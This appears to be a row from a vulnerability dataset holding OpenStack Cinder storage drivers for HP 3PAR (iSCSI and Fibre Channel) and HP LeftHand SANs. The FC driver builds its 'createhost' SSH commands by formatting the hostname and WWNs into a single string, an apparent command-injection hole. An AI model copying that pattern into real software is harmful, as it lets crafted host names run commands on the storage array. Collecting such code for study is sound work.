#    License for the specific language governing permissions and limitations
#    under the License.
#
""""""
Volume driver for HP 3PAR Storage array.
This driver requires 3.1.2 MU2 firmware on the 3PAR array.

You will need to install the python hp3parclient.
sudo pip install hp3parclient

Set the following in the cinder.conf file to enable the
3PAR iSCSI Driver along with the required flags:

volume_driver=cinder.volume.drivers.san.hp.hp_3par_iscsi.HP3PARISCSIDriver
""""""

import sys

from hp3parclient import exceptions as hpexceptions

from cinder import exception
from cinder.openstack.common import log as logging
from cinder import utils
import cinder.volume.driver
from cinder.volume.drivers.san.hp import hp_3par_common as hpcommon
from cinder.volume.drivers.san import san

VERSION = 1.1
LOG = logging.getLogger(__name__)
DEFAULT_ISCSI_PORT = 3260


class HP3PARISCSIDriver(cinder.volume.driver.ISCSIDriver):
    """"""OpenStack iSCSI driver to enable 3PAR storage array.

    Version history:
        1.0 - Initial driver
        1.1 - QoS, extend volume, multiple iscsi ports, remove domain,
              session changes, faster clone, requires 3.1.2 MU2 firmware.

    """"""
    def __init__(self, *args, **kwargs):
        super(HP3PARISCSIDriver, self).__init__(*args, **kwargs)
        self.common = None
        self.configuration.append_config_values(hpcommon.hp3par_opts)
        self.configuration.append_config_values(san.san_opts)

    def _init_common(self):
        return hpcommon.HP3PARCommon(self.configuration)

    def _check_flags(self):
        """"""Sanity check to ensure we have required options set.""""""
        required_flags = ['hp3par_api_url', 'hp3par_username',
                          'hp3par_password', 'san_ip', 'san_login',
                          'san_password']
        self.common.check_flags(self.configuration, required_flags)

    @utils.synchronized('3par', external=True)
    def get_volume_stats(self, refresh):
        self.common.client_login()
        stats = self.common.get_volume_stats(refresh)
        stats['storage_protocol'] = 'iSCSI'
        backend_name = self.configuration.safe_get('volume_backend_name')
        stats['volume_backend_name'] = backend_name or self.__class__.__name__
        self.common.client_logout()
        return stats

    def do_setup(self, context):
        self.common = self._init_common()
        self._check_flags()

        # map iscsi_ip-> ip_port
        #             -> iqn
        #             -> nsp
        self.iscsi_ips = {}
        temp_iscsi_ip = {}

        # use the 3PAR ip_addr list for iSCSI configuration
        if len(self.configuration.hp3par_iscsi_ips) > 0:
            # add port values to ip_addr, if necessary
            for ip_addr in self.configuration.hp3par_iscsi_ips:
                ip = ip_addr.split(':')
                if len(ip) == 1:
                    temp_iscsi_ip[ip_addr] = {'ip_port': DEFAULT_ISCSI_PORT}
                elif len(ip) == 2:
                    temp_iscsi_ip[ip[0]] = {'ip_port': ip[1]}
                else:
                    msg = _(""Invalid IP address format '%s'"") % ip_addr
                    LOG.warn(msg)

        # add the single value iscsi_ip_address option to the IP dictionary.
        # This way we can see if it's a valid iSCSI IP. If it's not valid,
        # we won't use it and won't bother to report it, see below
        if (self.configuration.iscsi_ip_address not in temp_iscsi_ip):
            ip = self.configuration.iscsi_ip_address
            ip_port = self.configuration.iscsi_port
            temp_iscsi_ip[ip] = {'ip_port': ip_port}

        # get all the valid iSCSI ports from 3PAR
        # when found, add the valid iSCSI ip, ip port, iqn and nsp
        # to the iSCSI IP dictionary
        # ...this will also make sure ssh works.
        iscsi_ports = self.common.get_ports()['iSCSI']
        for (ip, iscsi_info) in iscsi_ports.iteritems():
            if ip in temp_iscsi_ip:
                ip_port = temp_iscsi_ip[ip]['ip_port']
                self.iscsi_ips[ip] = {'ip_port': ip_port,
                                      'nsp': iscsi_info['nsp'],
                                      'iqn': iscsi_info['iqn']
                                      }
                del temp_iscsi_ip[ip]

        # if the single value iscsi_ip_address option is still in the
        # temp dictionary it's because it defaults to $my_ip which doesn't
        # make sense in this context. So, if present, remove it and move on.
        if (self.configuration.iscsi_ip_address in temp_iscsi_ip):
            del temp_iscsi_ip[self.configuration.iscsi_ip_address]

        # lets see if there are invalid iSCSI IPs left in the temp dict
        if len(temp_iscsi_ip) > 0:
            msg = _(""Found invalid iSCSI IP address(s) in configuration ""
                    ""option(s) hp3par_iscsi_ips or iscsi_ip_address '%s.'"") % \
                   ("", "".join(temp_iscsi_ip))
            LOG.warn(msg)

        if not len(self.iscsi_ips) > 0:
            msg = _('At least one valid iSCSI IP address must be set.')
            raise exception.InvalidInput(reason=(msg))

        self.common.do_setup(context)

    def check_for_setup_error(self):
        """"""Returns an error if prerequisites aren't met.""""""
        self._check_flags()

    @utils.synchronized('3par', external=True)
    def create_volume(self, volume):
        self.common.client_login()
        metadata = self.common.create_volume(volume)
        self.common.client_logout()

        return {'metadata': metadata}

    @utils.synchronized('3par', external=True)
    def create_cloned_volume(self, volume, src_vref):
        """"""Clone an existing volume.""""""
        self.common.client_login()
        new_vol = self.common.create_cloned_volume(volume, src_vref)
        self.common.client_logout()

        return {'metadata': new_vol}

    @utils.synchronized('3par', external=True)
    def delete_volume(self, volume):
        self.common.client_login()
        self.common.delete_volume(volume)
        self.common.client_logout()

    @utils.synchronized('3par', external=True)
    def create_volume_from_snapshot(self, volume, snapshot):
        """"""
        Creates a volume from a snapshot.

        TODO: support using the size from the user.
        """"""
        self.common.client_login()
        metadata = self.common.create_volume_from_snapshot(volume, snapshot)
        self.common.client_logout()
        return {'metadata': metadata}

    @utils.synchronized('3par', external=True)
    def create_snapshot(self, snapshot):
        self.common.client_login()
        self.common.create_snapshot(snapshot)
        self.common.client_logout()

    @utils.synchronized('3par', external=True)
    def delete_snapshot(self, snapshot):
        self.common.client_login()
        self.common.delete_snapshot(snapshot)
        self.common.client_logout()

    @utils.synchronized('3par', external=True)
    def initialize_connection(self, volume, connector):
        """"""Assigns the volume to a server.

        Assign any created volume to a compute node/host so that it can be
        used from that host.

        This driver returns a driver_volume_type of 'iscsi'.
        The format of the driver data is defined in _get_iscsi_properties.
        Example return value:

            {
                'driver_volume_type': 'iscsi'
                'data': {
                    'target_discovered': True,
                    'target_iqn': 'iqn.2010-10.org.openstack:volume-00000001',
                    'target_protal': '127.0.0.1:3260',
                    'volume_id': 1,
                }
            }

        Steps to export a volume on 3PAR
          * Get the 3PAR iSCSI iqn
          * Create a host on the 3par
          * create vlun on the 3par
        """"""
        self.common.client_login()

        # we have to make sure we have a host
        host = self._create_host(volume, connector)

        # now that we have a host, create the VLUN
        vlun = self.common.create_vlun(volume, host)

        self.common.client_logout()

        iscsi_ip = self._get_iscsi_ip(host['name'])
        iscsi_ip_port = self.iscsi_ips[iscsi_ip]['ip_port']
        iscsi_target_iqn = self.iscsi_ips[iscsi_ip]['iqn']
        info = {'driver_volume_type': 'iscsi',
                'data': {'target_portal': ""%s:%s"" %
                         (iscsi_ip, iscsi_ip_port),
                         'target_iqn': iscsi_target_iqn,
                         'target_lun': vlun['lun'],
                         'target_discovered': True
                         }
                }
        return info

    @utils.synchronized('3par', external=True)
    def terminate_connection(self, volume, connector, **kwargs):
        """"""Driver entry point to unattach a volume from an instance.""""""
        self.common.client_login()
        self.common.terminate_connection(volume,
                                         connector['host'],
                                         connector['initiator'])
        self.common.client_logout()

    def _create_3par_iscsi_host(self, hostname, iscsi_iqn, domain, persona_id):
        """"""Create a 3PAR host.

        Create a 3PAR host, if there is already a host on the 3par using
        the same iqn but with a different hostname, return the hostname
        used by 3PAR.
        """"""
        cmd = ['createhost', '-iscsi', '-persona', persona_id, '-domain',
               domain, hostname, iscsi_iqn]
        out = self.common._cli_run(cmd)
        if out and len(out) > 1:
            return self.common.parse_create_host_error(hostname, out)
        return hostname

    def _modify_3par_iscsi_host(self, hostname, iscsi_iqn):
        # when using -add, you can not send the persona or domain options
        command = ['createhost', '-iscsi', '-add', hostname, iscsi_iqn]
        self.common._cli_run(command)

    def _create_host(self, volume, connector):
        """"""Creates or modifies existing 3PAR host.""""""
        # make sure we don't have the host already
        host = None
        hostname = self.common._safe_hostname(connector['host'])
        cpg = self.common.get_cpg(volume, allowSnap=True)
        domain = self.common.get_domain(cpg)
        try:
            host = self.common._get_3par_host(hostname)
            if not host['iSCSIPaths']:
                self._modify_3par_iscsi_host(hostname, connector['initiator'])
                host = self.common._get_3par_host(hostname)
        except hpexceptions.HTTPNotFound:
            # get persona from the volume type extra specs
            persona_id = self.common.get_persona_type(volume)
            # host doesn't exist, we have to create it
            hostname = self._create_3par_iscsi_host(hostname,
                                                    connector['initiator'],
                                                    domain,
                                                    persona_id)
            host = self.common._get_3par_host(hostname)

        return host

    @utils.synchronized('3par', external=True)
    def create_export(self, context, volume):
        pass

    @utils.synchronized('3par', external=True)
    def ensure_export(self, context, volume):
        pass

    @utils.synchronized('3par', external=True)
    def remove_export(self, context, volume):
        pass

    def _get_iscsi_ip(self, hostname):
        """"""Get an iSCSI IP address to use.

        Steps to determine which IP address to use.
          * If only one IP address, return it
          * If there is an active vlun, return the IP associated with it
          * Return IP with fewest active vluns
        """"""
        if len(self.iscsi_ips) == 1:
            return self.iscsi_ips.keys()[0]

        # if we currently have an active port, use it
        nsp = self._get_active_nsp(hostname)

        if nsp is None:
            # no active vlun, find least busy port
            nsp = self._get_least_used_nsp(self._get_iscsi_nsps())
            if nsp is None:
                msg = _(""Least busy iSCSI port not found, ""
                        ""using first iSCSI port in list."")
                LOG.warn(msg)
                return self.iscsi_ips.keys()[0]

        return self._get_ip_using_nsp(nsp)

    def _get_iscsi_nsps(self):
        """"""Return the list of candidate nsps.""""""
        nsps = []
        for value in self.iscsi_ips.values():
            nsps.append(value['nsp'])
        return nsps

    def _get_ip_using_nsp(self, nsp):
        """"""Return IP assiciated with given nsp.""""""
        for (key, value) in self.iscsi_ips.items():
            if value['nsp'] == nsp:
                return key

    def _get_active_nsp(self, hostname):
        """"""Return the active nsp, if one exists, for the given host.""""""
        result = self.common._cli_run(['showvlun', '-a', '-host', hostname])
        if result:
            # first line is header
            result = result[1:]
            for line in result:
                info = line.split("","")
                if info and len(info) > 4:
                    return info[4]

    def _get_least_used_nsp(self, nspss):
        """"""""Return the nsp that has the fewest active vluns.""""""
        # return only the nsp (node:server:port)
        result = self.common._cli_run(['showvlun', '-a', '-showcols', 'Port'])

        # count the number of nsps (there is 1 for each active vlun)
        nsp_counts = {}
        for nsp in nspss:
            # initialize counts to zero
            nsp_counts[nsp] = 0

        current_least_used_nsp = None
        if result:
            # first line is header
            result = result[1:]
            for line in result:
                nsp = line.strip()
                if nsp in nsp_counts:
                    nsp_counts[nsp] = nsp_counts[nsp] + 1

            # identify key (nsp) of least used nsp
            current_smallest_count = sys.maxint
            for (nsp, count) in nsp_counts.iteritems():
                if count < current_smallest_count:
                    current_least_used_nsp = nsp
                    current_smallest_count = count

        return current_least_used_nsp

    def extend_volume(self, volume, new_size):
        self.common.extend_volume(volume, new_size)
/n/n/ncinder/volume/drivers/san/hp_lefthand.py/n/n#    Copyright 2012 OpenStack LLC
#
#    Licensed under the Apache License, Version 2.0 (the ""License""); you may
#    not use this file except in compliance with the License. You may obtain
#    a copy of the License at
#
#         http://www.apache.org/licenses/LICENSE-2.0
#
#    Unless required by applicable law or agreed to in writing, software
#    distributed under the License is distributed on an ""AS IS"" BASIS, WITHOUT
#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
#    License for the specific language governing permissions and limitations
#    under the License.
""""""
HP Lefthand SAN ISCSI Driver.

The driver communicates to the backend aka Cliq via SSH to perform all the
operations on the SAN.
""""""
from lxml import etree

from cinder import exception
from cinder.openstack.common import log as logging
from cinder.volume.drivers.san.san import SanISCSIDriver


LOG = logging.getLogger(__name__)


class HpSanISCSIDriver(SanISCSIDriver):
    """"""Executes commands relating to HP/Lefthand SAN ISCSI volumes.

    We use the CLIQ interface, over SSH.

    Rough overview of CLIQ commands used:

    :createVolume:    (creates the volume)

    :getVolumeInfo:    (to discover the IQN etc)

    :getClusterInfo:    (to discover the iSCSI target IP address)

    :assignVolumeChap:    (exports it with CHAP security)

    The 'trick' here is that the HP SAN enforces security by default, so
    normally a volume mount would need both to configure the SAN in the volume
    layer and do the mount on the compute layer.  Multi-layer operations are
    not catered for at the moment in the cinder architecture, so instead we
    share the volume using CHAP at volume creation time.  Then the mount need
    only use those CHAP credentials, so can take place exclusively in the
    compute layer.
    """"""

    device_stats = {}

    def __init__(self, *args, **kwargs):
        super(HpSanISCSIDriver, self).__init__(*args, **kwargs)
        self.cluster_vip = None

    def _cliq_run(self, verb, cliq_args, check_exit_code=True):
        """"""Runs a CLIQ command over SSH, without doing any result parsing""""""
        cmd_list = [verb]
        for k, v in cliq_args.items():
            cmd_list.append(""%s=%s"" % (k, v))

        return self._run_ssh(cmd_list, check_exit_code)

    def _cliq_run_xml(self, verb, cliq_args, check_cliq_result=True):
        """"""Runs a CLIQ command over SSH, parsing and checking the output""""""
        cliq_args['output'] = 'XML'
        (out, _err) = self._cliq_run(verb, cliq_args, check_cliq_result)

        LOG.debug(_(""CLIQ command returned %s""), out)

        result_xml = etree.fromstring(out)
        if check_cliq_result:
            response_node = result_xml.find(""response"")
            if response_node is None:
                msg = (_(""Malformed response to CLIQ command ""
                         ""%(verb)s %(cliq_args)s. Result=%(out)s"") %
                       {'verb': verb, 'cliq_args': cliq_args, 'out': out})
                raise exception.VolumeBackendAPIException(data=msg)

            result_code = response_node.attrib.get(""result"")

            if result_code != ""0"":
                msg = (_(""Error running CLIQ command %(verb)s %(cliq_args)s. ""
                         "" Result=%(out)s"") %
                       {'verb': verb, 'cliq_args': cliq_args, 'out': out})
                raise exception.VolumeBackendAPIException(data=msg)

        return result_xml

    def _cliq_get_cluster_info(self, cluster_name):
        """"""Queries for info about the cluster (including IP)""""""
        cliq_args = {}
        cliq_args['clusterName'] = cluster_name
        cliq_args['searchDepth'] = '1'
        cliq_args['verbose'] = '0'

        result_xml = self._cliq_run_xml(""getClusterInfo"", cliq_args)

        return result_xml

    def _cliq_get_cluster_vip(self, cluster_name):
        """"""Gets the IP on which a cluster shares iSCSI volumes""""""
        cluster_xml = self._cliq_get_cluster_info(cluster_name)

        vips = []
        for vip in cluster_xml.findall(""response/cluster/vip""):
            vips.append(vip.attrib.get('ipAddress'))

        if len(vips) == 1:
            return vips[0]

        _xml = etree.tostring(cluster_xml)
        msg = (_(""Unexpected number of virtual ips for cluster ""
                 "" %(cluster_name)s. Result=%(_xml)s"") %
               {'cluster_name': cluster_name, '_xml': _xml})
        raise exception.VolumeBackendAPIException(data=msg)

    def _cliq_get_volume_info(self, volume_name):
        """"""Gets the volume info, including IQN""""""
        cliq_args = {}
        cliq_args['volumeName'] = volume_name
        result_xml = self._cliq_run_xml(""getVolumeInfo"", cliq_args)

        # Result looks like this:
        #<gauche version=""1.0"">
        #  <response description=""Operation succeeded."" name=""CliqSuccess""
        #            processingTime=""87"" result=""0"">
        #    <volume autogrowPages=""4"" availability=""online"" blockSize=""1024""
        #       bytesWritten=""0"" checkSum=""false"" clusterName=""Cluster01""
        #       created=""2011-02-08T19:56:53Z"" deleting=""false"" description=""""
        #       groupName=""Group01"" initialQuota=""536870912"" isPrimary=""true""
        #       iscsiIqn=""iqn.2003-10.com.lefthandnetworks:group01:25366:vol-b""
        #       maxSize=""6865387257856"" md5=""9fa5c8b2cca54b2948a63d833097e1ca""
        #       minReplication=""1"" name=""vol-b"" parity=""0"" replication=""2""
        #       reserveQuota=""536870912"" scratchQuota=""4194304""
        #       serialNumber=""9fa5c8b2cca54b2948a63d833097e1ca0000000000006316""
        #       size=""1073741824"" stridePages=""32"" thinProvision=""true"">
        #      <status description=""OK"" value=""2""/>
        #      <permission access=""rw""
        #            authGroup=""api-34281B815713B78-(trimmed)51ADD4B7030853AA7""
        #            chapName=""chapusername"" chapRequired=""true"" id=""25369""
        #            initiatorSecret="""" iqn="""" iscsiEnabled=""true""
        #            loadBalance=""true"" targetSecret=""supersecret""/>
        #    </volume>
        #  </response>
        #</gauche>

        # Flatten the nodes into a dictionary; use prefixes to avoid collisions
        volume_attributes = {}

        volume_node = result_xml.find(""response/volume"")
        for k, v in volume_node.attrib.items():
            volume_attributes[""volume."" + k] = v

        status_node = volume_node.find(""status"")
        if status_node is not None:
            for k, v in status_node.attrib.items():
                volume_attributes[""status."" + k] = v

        # We only consider the first permission node
        permission_node = volume_node.find(""permission"")
        if permission_node is not None:
            for k, v in status_node.attrib.items():
                volume_attributes[""permission."" + k] = v

        LOG.debug(_(""Volume info: %(volume_name)s => %(volume_attributes)s"") %
                  {'volume_name': volume_name,
                   'volume_attributes': volume_attributes})
        return volume_attributes

    def create_volume(self, volume):
        """"""Creates a volume.""""""
        cliq_args = {}
        cliq_args['clusterName'] = self.configuration.san_clustername

        if self.configuration.san_thin_provision:
            cliq_args['thinProvision'] = '1'
        else:
            cliq_args['thinProvision'] = '0'

        cliq_args['volumeName'] = volume['name']
        if int(volume['size']) == 0:
            cliq_args['size'] = '100MB'
        else:
            cliq_args['size'] = '%sGB' % volume['size']

        self._cliq_run_xml(""createVolume"", cliq_args)

        volume_info = self._cliq_get_volume_info(volume['name'])
        cluster_name = volume_info['volume.clusterName']
        iscsi_iqn = volume_info['volume.iscsiIqn']

        #TODO(justinsb): Is this always 1? Does it matter?
        cluster_interface = '1'

        if not self.cluster_vip:
            self.cluster_vip = self._cliq_get_cluster_vip(cluster_name)
        iscsi_portal = self.cluster_vip + "":3260,"" + cluster_interface

        model_update = {}

        # NOTE(jdg): LH volumes always at lun 0 ?
        model_update['provider_location'] = (""%s %s %s"" %
                                             (iscsi_portal,
                                              iscsi_iqn,
                                              0))

        return model_update

    def create_volume_from_snapshot(self, volume, snapshot):
        """"""Creates a volume from a snapshot.""""""
        raise NotImplementedError()

    def create_snapshot(self, snapshot):
        """"""Creates a snapshot.""""""
        raise NotImplementedError()

    def delete_volume(self, volume):
        """"""Deletes a volume.""""""
        cliq_args = {}
        cliq_args['volumeName'] = volume['name']
        cliq_args['prompt'] = 'false'  # Don't confirm
        try:
            volume_info = self._cliq_get_volume_info(volume['name'])
        except exception.ProcessExecutionError:
            LOG.error(""Volume did not exist. It will not be deleted"")
            return
        self._cliq_run_xml(""deleteVolume"", cliq_args)

    def local_path(self, volume):
        msg = _(""local_path not supported"")
        raise exception.VolumeBackendAPIException(data=msg)

    def initialize_connection(self, volume, connector):
        """"""Assigns the volume to a server.

        Assign any created volume to a compute node/host so that it can be
        used from that host. HP VSA requires a volume to be assigned
        to a server.

        This driver returns a driver_volume_type of 'iscsi'.
        The format of the driver data is defined in _get_iscsi_properties.
        Example return value:

            {
                'driver_volume_type': 'iscsi'
                'data': {
                    'target_discovered': True,
                    'target_iqn': 'iqn.2010-10.org.openstack:volume-00000001',
                    'target_protal': '127.0.0.1:3260',
                    'volume_id': 1,
                }
            }

        """"""
        self._create_server(connector)
        cliq_args = {}
        cliq_args['volumeName'] = volume['name']
        cliq_args['serverName'] = connector['host']
        self._cliq_run_xml(""assignVolumeToServer"", cliq_args)

        iscsi_properties = self._get_iscsi_properties(volume)
        return {
            'driver_volume_type': 'iscsi',
            'data': iscsi_properties
        }

    def _create_server(self, connector):
        cliq_args = {}
        cliq_args['serverName'] = connector['host']
        out = self._cliq_run_xml(""getServerInfo"", cliq_args, False)
        response = out.find(""response"")
        result = response.attrib.get(""result"")
        if result != '0':
            cliq_args = {}
            cliq_args['serverName'] = connector['host']
            cliq_args['initiator'] = connector['initiator']
            self._cliq_run_xml(""createServer"", cliq_args)

    def terminate_connection(self, volume, connector, **kwargs):
        """"""Unassign the volume from the host.""""""
        cliq_args = {}
        cliq_args['volumeName'] = volume['name']
        cliq_args['serverName'] = connector['host']
        self._cliq_run_xml(""unassignVolumeToServer"", cliq_args)

    def get_volume_stats(self, refresh):
        if refresh:
            self._update_backend_status()

        return self.device_stats

    def _update_backend_status(self):
        data = {}
        backend_name = self.configuration.safe_get('volume_backend_name')
        data['volume_backend_name'] = backend_name or self.__class__.__name__
        data['driver_version'] = '1.0'
        data['reserved_percentage'] = 0
        data['storage_protocol'] = 'iSCSI'
        data['vendor_name'] = 'Hewlett-Packard'

        result_xml = self._cliq_run_xml(""getClusterInfo"", {})
        cluster_node = result_xml.find(""response/cluster"")
        total_capacity = cluster_node.attrib.get(""spaceTotal"")
        free_capacity = cluster_node.attrib.get(""unprovisionedSpace"")
        GB = 1073741824

        data['total_capacity_gb'] = int(total_capacity) / GB
        data['free_capacity_gb'] = int(free_capacity) / GB
        self.device_stats = data
/n/n/n",0
65,65,c55589b131828f3a595903f6796cb2d0babb772f,"/cinder/volume/drivers/san/hp/hp_3par_fc.py/n/n# vim: tabstop=4 shiftwidth=4 softtabstop=4
#
#    (c) Copyright 2013 Hewlett-Packard Development Company, L.P.
#    All Rights Reserved.
#
#    Copyright 2012 OpenStack LLC
#
#    Licensed under the Apache License, Version 2.0 (the ""License""); you may
#    not use this file except in compliance with the License. You may obtain
#    a copy of the License at
#
#         http://www.apache.org/licenses/LICENSE-2.0
#
#    Unless required by applicable law or agreed to in writing, software
#    distributed under the License is distributed on an ""AS IS"" BASIS, WITHOUT
#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
#    License for the specific language governing permissions and limitations
#    under the License.
#
""""""
Volume driver for HP 3PAR Storage array.
This driver requires 3.1.2 MU2 firmware on the 3PAR array.

You will need to install the python hp3parclient.
sudo pip install hp3parclient

Set the following in the cinder.conf file to enable the
3PAR Fibre Channel Driver along with the required flags:

volume_driver=cinder.volume.drivers.san.hp.hp_3par_fc.HP3PARFCDriver
""""""

from hp3parclient import exceptions as hpexceptions
from oslo.config import cfg

from cinder import exception
from cinder.openstack.common import log as logging
from cinder import utils
import cinder.volume.driver
from cinder.volume.drivers.san.hp import hp_3par_common as hpcommon
from cinder.volume.drivers.san import san

VERSION = 1.1
LOG = logging.getLogger(__name__)


class HP3PARFCDriver(cinder.volume.driver.FibreChannelDriver):
    """"""OpenStack Fibre Channel driver to enable 3PAR storage array.

    Version history:
        1.0 - Initial driver
        1.1 - QoS, extend volume, multiple iscsi ports, remove domain,
              session changes, faster clone, requires 3.1.2 MU2 firmware,
              copy volume <--> Image.
    """"""

    def __init__(self, *args, **kwargs):
        super(HP3PARFCDriver, self).__init__(*args, **kwargs)
        self.common = None
        self.configuration.append_config_values(hpcommon.hp3par_opts)
        self.configuration.append_config_values(san.san_opts)

    def _init_common(self):
        return hpcommon.HP3PARCommon(self.configuration)

    def _check_flags(self):
        """"""Sanity check to ensure we have required options set.""""""
        required_flags = ['hp3par_api_url', 'hp3par_username',
                          'hp3par_password',
                          'san_ip', 'san_login', 'san_password']
        self.common.check_flags(self.configuration, required_flags)

    @utils.synchronized('3par', external=True)
    def get_volume_stats(self, refresh):
        self.common.client_login()
        stats = self.common.get_volume_stats(refresh)
        stats['storage_protocol'] = 'FC'
        backend_name = self.configuration.safe_get('volume_backend_name')
        stats['volume_backend_name'] = backend_name or self.__class__.__name__
        self.common.client_logout()
        return stats

    def do_setup(self, context):
        self.common = self._init_common()
        self._check_flags()
        self.common.do_setup(context)

    def check_for_setup_error(self):
        """"""Returns an error if prerequisites aren't met.""""""
        self._check_flags()

    @utils.synchronized('3par', external=True)
    def create_volume(self, volume):
        self.common.client_login()
        metadata = self.common.create_volume(volume)
        self.common.client_logout()
        return {'metadata': metadata}

    @utils.synchronized('3par', external=True)
    def create_cloned_volume(self, volume, src_vref):
        self.common.client_login()
        new_vol = self.common.create_cloned_volume(volume, src_vref)
        self.common.client_logout()
        return {'metadata': new_vol}

    @utils.synchronized('3par', external=True)
    def delete_volume(self, volume):
        self.common.client_login()
        self.common.delete_volume(volume)
        self.common.client_logout()

    @utils.synchronized('3par', external=True)
    def create_volume_from_snapshot(self, volume, snapshot):
        """"""
        Creates a volume from a snapshot.

        TODO: support using the size from the user.
        """"""
        self.common.client_login()
        metadata = self.common.create_volume_from_snapshot(volume, snapshot)
        self.common.client_logout()
        return {'metadata': metadata}

    @utils.synchronized('3par', external=True)
    def create_snapshot(self, snapshot):
        self.common.client_login()
        self.common.create_snapshot(snapshot)
        self.common.client_logout()

    @utils.synchronized('3par', external=True)
    def delete_snapshot(self, snapshot):
        self.common.client_login()
        self.common.delete_snapshot(snapshot)
        self.common.client_logout()

    @utils.synchronized('3par', external=True)
    def initialize_connection(self, volume, connector):
        """"""Assigns the volume to a server.

        Assign any created volume to a compute node/host so that it can be
        used from that host.

        The  driver returns a driver_volume_type of 'fibre_channel'.
        The target_wwn can be a single entry or a list of wwns that
        correspond to the list of remote wwn(s) that will export the volume.
        Example return values:

            {
                'driver_volume_type': 'fibre_channel'
                'data': {
                    'target_discovered': True,
                    'target_lun': 1,
                    'target_wwn': '1234567890123',
                }
            }

            or

             {
                'driver_volume_type': 'fibre_channel'
                'data': {
                    'target_discovered': True,
                    'target_lun': 1,
                    'target_wwn': ['1234567890123', '0987654321321'],
                }
            }


        Steps to export a volume on 3PAR
          * Create a host on the 3par with the target wwn
          * Create a VLUN for that HOST with the volume we want to export.

        """"""
        self.common.client_login()
        # we have to make sure we have a host
        host = self._create_host(volume, connector)

        # now that we have a host, create the VLUN
        vlun = self.common.create_vlun(volume, host)

        ports = self.common.get_ports()

        self.common.client_logout()
        info = {'driver_volume_type': 'fibre_channel',
                'data': {'target_lun': vlun['lun'],
                         'target_discovered': True,
                         'target_wwn': ports['FC']}}
        return info

    @utils.synchronized('3par', external=True)
    def terminate_connection(self, volume, connector, **kwargs):
        """"""Driver entry point to unattach a volume from an instance.""""""
        self.common.client_login()
        self.common.terminate_connection(volume,
                                         connector['host'],
                                         connector['wwpns'])
        self.common.client_logout()

    def _create_3par_fibrechan_host(self, hostname, wwn, domain, persona_id):
        """"""Create a 3PAR host.

        Create a 3PAR host, if there is already a host on the 3par using
        the same wwn but with a different hostname, return the hostname
        used by 3PAR.
        """"""
        out = self.common._cli_run('createhost -persona %s -domain %s %s %s'
                                   % (persona_id, domain,
                                      hostname, "" "".join(wwn)), None)
        if out and len(out) > 1:
            return self.common.parse_create_host_error(hostname, out)

        return hostname

    def _modify_3par_fibrechan_host(self, hostname, wwn):
        # when using -add, you can not send the persona or domain options
        out = self.common._cli_run('createhost -add %s %s'
                                   % (hostname, "" "".join(wwn)), None)

    def _create_host(self, volume, connector):
        """"""Creates or modifies existing 3PAR host.""""""
        host = None
        hostname = self.common._safe_hostname(connector['host'])
        cpg = self.common.get_cpg(volume, allowSnap=True)
        domain = self.common.get_domain(cpg)
        try:
            host = self.common._get_3par_host(hostname)
            if not host['FCPaths']:
                self._modify_3par_fibrechan_host(hostname, connector['wwpns'])
                host = self.common._get_3par_host(hostname)
        except hpexceptions.HTTPNotFound as ex:
            # get persona from the volume type extra specs
            persona_id = self.common.get_persona_type(volume)
            # host doesn't exist, we have to create it
            hostname = self._create_3par_fibrechan_host(hostname,
                                                        connector['wwpns'],
                                                        domain,
                                                        persona_id)
            host = self.common._get_3par_host(hostname)

        return host

    @utils.synchronized('3par', external=True)
    def create_export(self, context, volume):
        pass

    @utils.synchronized('3par', external=True)
    def ensure_export(self, context, volume):
        pass

    @utils.synchronized('3par', external=True)
    def remove_export(self, context, volume):
        pass

    def extend_volume(self, volume, new_size):
        self.common.extend_volume(volume, new_size)
/n/n/n/cinder/volume/drivers/san/hp/hp_3par_iscsi.py/n/n# vim: tabstop=4 shiftwidth=4 softtabstop=4
#
#    (c) Copyright 2012-2013 Hewlett-Packard Development Company, L.P.
#    All Rights Reserved.
#
#    Copyright 2012 OpenStack LLC
#
#    Licensed under the Apache License, Version 2.0 (the ""License""); you may
#    not use this file except in compliance with the License. You may obtain
#    a copy of the License at
#
#         http://www.apache.org/licenses/LICENSE-2.0
#
#    Unless required by applicable law or agreed to in writing, software
#    distributed under the License is distributed on an ""AS IS"" BASIS, WITHOUT
#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
#    License for the specific language governing permissions and limitations
#    under the License.
#
""""""
Volume driver for HP 3PAR Storage array.
This driver requires 3.1.2 MU2 firmware on the 3PAR array.

You will need to install the python hp3parclient.
sudo pip install hp3parclient

Set the following in the cinder.conf file to enable the
3PAR iSCSI Driver along with the required flags:

volume_driver=cinder.volume.drivers.san.hp.hp_3par_iscsi.HP3PARISCSIDriver
""""""

import sys

from hp3parclient import exceptions as hpexceptions

from cinder import exception
from cinder.openstack.common import log as logging
from cinder import utils
import cinder.volume.driver
from cinder.volume.drivers.san.hp import hp_3par_common as hpcommon
from cinder.volume.drivers.san import san

VERSION = 1.1
LOG = logging.getLogger(__name__)
DEFAULT_ISCSI_PORT = 3260


class HP3PARISCSIDriver(cinder.volume.driver.ISCSIDriver):
    """"""OpenStack iSCSI driver to enable 3PAR storage array.

    Version history:
        1.0 - Initial driver
        1.1 - QoS, extend volume, multiple iscsi ports, remove domain,
              session changes, faster clone, requires 3.1.2 MU2 firmware.

    """"""
    def __init__(self, *args, **kwargs):
        super(HP3PARISCSIDriver, self).__init__(*args, **kwargs)
        self.common = None
        self.configuration.append_config_values(hpcommon.hp3par_opts)
        self.configuration.append_config_values(san.san_opts)

    def _init_common(self):
        return hpcommon.HP3PARCommon(self.configuration)

    def _check_flags(self):
        """"""Sanity check to ensure we have required options set.""""""
        required_flags = ['hp3par_api_url', 'hp3par_username',
                          'hp3par_password', 'san_ip', 'san_login',
                          'san_password']
        self.common.check_flags(self.configuration, required_flags)

    @utils.synchronized('3par', external=True)
    def get_volume_stats(self, refresh):
        self.common.client_login()
        stats = self.common.get_volume_stats(refresh)
        stats['storage_protocol'] = 'iSCSI'
        backend_name = self.configuration.safe_get('volume_backend_name')
        stats['volume_backend_name'] = backend_name or self.__class__.__name__
        self.common.client_logout()
        return stats

    def do_setup(self, context):
        self.common = self._init_common()
        self._check_flags()

        # map iscsi_ip-> ip_port
        #             -> iqn
        #             -> nsp
        self.iscsi_ips = {}
        temp_iscsi_ip = {}

        # use the 3PAR ip_addr list for iSCSI configuration
        if len(self.configuration.hp3par_iscsi_ips) > 0:
            # add port values to ip_addr, if necessary
            for ip_addr in self.configuration.hp3par_iscsi_ips:
                ip = ip_addr.split(':')
                if len(ip) == 1:
